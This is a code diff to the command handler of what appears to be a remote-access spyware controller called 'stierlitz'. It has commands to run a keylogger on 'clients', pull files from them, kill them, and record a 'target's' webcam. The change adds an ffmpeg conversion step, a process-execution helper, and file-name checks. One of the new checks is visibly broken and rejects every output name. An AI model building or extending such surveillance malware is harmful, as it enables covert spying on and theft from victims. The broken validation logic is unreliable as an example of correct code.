@@ -84,9 +84,10 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(FILE_NAME_ARG, ARG_TYPE_STRING, "-f", "--file-name"));
     argument_list_.push_back(Argument(DEVICE_ARG, ARG_TYPE_INT, "-d", "--dev"));
     argument_list_.push_back(Argument(KB_LAYOUT_ARG, ARG_TYPE_STRING, "-l", "--layout"));
+    argument_list_.push_back(Argument(CONVERT_ARG, ARG_TYPE_SET, "-c", "--convert"));
 
     command_map_.emplace("help", Command(
-        "Show this help message. For specific command help <command> or <command> -h/--help", 
+        "Show this help message.\n\tFor specific command <command> -h/--help", 
         &CommandHandler::help,
         this,
         {HELP_ARG}
@@ -105,7 +106,7 @@ CommandHandler::CommandHandler(
         {HELP_ARG}
     ));
     command_map_.emplace("set-verb", Command(
-        "Set verbosity level",
+        "Set verbosity level.\n\tset-verb -v <verbosity>",
         &CommandHandler::set_verbosity,
         this,
         {HELP_ARG},
@@ -118,14 +119,14 @@ CommandHandler::CommandHandler(
         {HELP_ARG}
     ));
     command_map_.emplace("kill", Command(
-        "Kill the selected client. Usage: kill -i <client_index> / kill -a to kill all clients",
+        "Kill the selected client. Usage:\n\tkill -i <client_index>\n\tkill -a to kill all clients",
         &CommandHandler::kill,
         this,
         {HELP_ARG},
         {INDEX_ARG, ALL_ARG}
     ));
     command_map_.emplace("get-file", Command(
-       "Get a file from the client. Usage: get-file -i <client_index> -f <file_name>. Use -o <output_file_name> to save the file",
+       "Get a file from the client. Usage:\n\tget-file -i <client_index> -f <file_name>. Use -o <output_file_name> to save the file",
         &CommandHandler::get_file,
         this,
         {HELP_ARG},
@@ -139,18 +140,18 @@ CommandHandler::CommandHandler(
         {INDEX_ARG, OUT_ARG}
     ));
     command_map_.emplace("keylogger", Command(
-        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index> -d <device number for eventX>\nBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \nUse -rm to remove the keylogger from the client",
+        "Start listening the key logs of the selected client. Usage:\n\tkeylogger -i <client_index> -d <device number for eventX>\n\tBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \n\tUse -rm to remove the keylogger from the client",
         &CommandHandler::keylogger,
         this,
         {HELP_ARG, REMOVE_ARG, DEVICE_ARG, KB_LAYOUT_ARG},
         {INDEX_ARG}
     ));
     command_map_.emplace("webcam", Command(
-        "Start capturing target's webcam. Usage: webcam -i <client_index>. Optional -d <device number for /dev/videoX> (default = 0),  -o <output_file>",
+        "Start capturing target's webcam. Usage: \n\twebcam -i <client_index>. \n\t-d <device number for /dev/videoX> (default = 0),  \n\t-o <output_file> (if not given, captured data will not be saved)\n\twebcam -c -f <.mjpeg> -o <.avi> will convert the file into watchable format\n\t-rm to remove the keylogger from the client",
         &CommandHandler::webcam_recorder,
         this,
-        {HELP_ARG, REMOVE_ARG, DEVICE_ARG, OUT_ARG},
-        {INDEX_ARG}
+        {HELP_ARG, INDEX_ARG, REMOVE_ARG, DEVICE_ARG, FILE_NAME_ARG, CONVERT_ARG, OUT_ARG},
+        {}
     ));
 }
 
@@ -334,6 +335,70 @@ void CommandHandler::send_client(CommandCode __command) {
     }
 }
 
+int CommandHandler::local_execute(const char* __argv[]) {
+    int out_pipe[2];
+    int err_pipe[2];
+
+    int rc = pipe2(out_pipe, O_CLOEXEC);
+    if (rc < 0) {
+        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::local_execute] Failed to pipe out_pie" << RESET;
+        return -1;
+    }
+
+    rc = pipe2(err_pipe, O_CLOEXEC);
+    if (rc < 0) {
+        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::local_execute] Failed to pipe err_pie" << RESET;
+        close(out_pipe[0]);
+        close(out_pipe[1]);
+    }
+    
+
+    pid_t pid = fork();
+    if (pid < 0) {
+        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::local_execute] Failed to fork" << RESET;
+        close(out_pipe[0]); close(out_pipe[1]);
+        close(err_pipe[0]); close(err_pipe[1]);
+        return -1;
+    } else if (pid == 0) {
+        close(out_pipe[0]);
+        close(err_pipe[0]);
+        
+        dup2(out_pipe[1], STDOUT_FILENO);
+        dup2(err_pipe[1], STDERR_FILENO);
+
+        close(out_pipe[1]);
+        close(err_pipe[1]);
+
+        execvp(__argv[0], const_cast<char* const*>(__argv));
+        _exit(EXIT_FAILURE);
+    } else {
+        close(out_pipe[1]);
+        close(err_pipe[1]);
+
+        char buffer[BUFFER_SIZE];
+        size_t count;
+
+        // Read stdout
+        while ((count = read(out_pipe[0], buffer, sizeof(buffer) -1)) > 0) {
+            buffer[count] = '\0';
+            *p_event_log_ << LOG_MUST << "[CommandHandler::local_execute]\n" << buffer << RESET;
+        }
+
+        // Read stderr
+        while ((count = read(err_pipe[0], buffer, sizeof(buffer) -1)) > 0) {
+            buffer[count] = '\0';
+            *p_event_log_ << LOG_MUST << "[CommandHandler::local_execute]\n" << buffer << RESET;
+        }
+
+        close(out_pipe[0]);
+        close(err_pipe[0]);
+
+        int status;
+        waitpid(pid, &status, 0);
+        return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
+    }
+}
+
 void CommandHandler::help() {
     *p_event_log_ << LOG_MUST << CYAN << "\nstierlitz Available commands\n";
     for (const auto& [cmd, command] : command_map_) {
@@ -487,8 +552,47 @@ void CommandHandler::keylogger() {
 }
 
 void CommandHandler::webcam_recorder() {
-    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+    if (arg_map_.find(CONVERT_ARG) != arg_map_.end()) { // just convert
+        if (arg_map_.find(FILE_NAME_ARG) == arg_map_.end()) {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Please specify a mjpeg file that will be converted" << RESET_C2_FIFO; 
+            return;
+        }
 
+        std::string in_name = std::any_cast<std::string>(arg_map_[FILE_NAME_ARG]);
+        if (in_name.find_last_of('.') == std::string::npos || in_name.substr(in_name.find_last_of('.') + 1) != "mjpeg") {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid input file format. Only '.mjpeg' is supported. " << RESET_C2_FIFO;
+            return;
+        }
+
+        if (arg_map_.find(OUT_ARG) == arg_map_.end()) {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Please specify a '.avi' file to convert to" << RESET_C2_FIFO; 
+            return;
+        }
+
+        std::string out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
+        if (out_name.find_last_of('.') == std::string::npos || out_name.substr(out_name.find_last_of('.') + 1) != "avi") {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid output file format. Only '.avi' is supported." << RESET_C2_FIFO;
+            return;
+        }
+
+        // Convert using ffempg
+        const char* argv[] = {
+            "ffmpeg",
+            "-f", "mjpeg",
+            "-i", in_name.c_str(),
+            "-c:v", "copy",
+            out_name.c_str(),
+            nullptr
+        };
+
+        local_execute(argv);
+        return;
+    }
+    if (arg_map_.find(INDEX_ARG) == arg_map_.end()) {
+        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid usage. webcam_recorder -h/--help for usage" << RESET_C2_FIFO;
+        return;
+    }
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
     Tunnel* p_tunnel = get_tunnel(client_index, WEBCAM_RECORDER);
 
     if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
@@ -498,7 +602,7 @@ void CommandHandler::webcam_recorder() {
             send_client(WEBCAM_RECORDER, 0, client_index);
             *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::webcam_recorder] Webcam Recorder removed from client " << client_index << RESET_C2_FIFO;
         } else {
-            *p_event_log_ << LOG_MUST << RED << "CommandHandler::webcam_recorder] Webcam Recorder is not active for client " << client_index << RESET_C2_FIFO; 
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Webcam Recorder is not active for client " << client_index << RESET_C2_FIFO; 
         }
     } else {
         if (p_tunnel == nullptr) {
@@ -510,6 +614,12 @@ void CommandHandler::webcam_recorder() {
             std::string out_name = "";
             if (arg_map_.find(OUT_ARG) != arg_map_.end()) {
                 out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
+
+                if (out_name.find_last_of('.') != std::string::npos || 
+                    out_name.substr(out_name.find_last_of('.') + 1) != "mjpeg") {
+                    *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid file format. Only .mjpeg is supported." << RESET_C2_FIFO;
+                    return;
+                }
             }
 
             WebcamRecorder* p_webcam_recorder = new WebcamRecorder();
